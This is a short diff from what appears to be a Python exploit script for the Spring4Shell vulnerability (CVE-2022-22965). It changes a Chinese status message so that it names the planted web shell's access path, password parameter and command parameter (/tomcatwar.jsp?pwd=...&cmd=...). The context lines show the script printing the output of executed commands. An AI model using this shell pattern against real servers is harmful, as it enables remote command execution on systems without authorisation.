@@ -51,7 +51,7 @@ def CVE_2022_22965(url, proxies):
                 result = re.findall('([^\x00]+)\n', resp)[0]
                 cprint(result ,"green")
         else:
-            cprint("[-] CVE-2022-22965漏洞不存在或者已经被利用,shell地址自行扫描\n","yellow")
+            cprint("[-] CVE-2022-22965漏洞不存在或者已经被利用,shell地址请手动尝试访问 [/tomcatwar.jsp?pwd=aabysszg&cmd=命令] \n","yellow")
     except Exception as e:
         print(e)
 
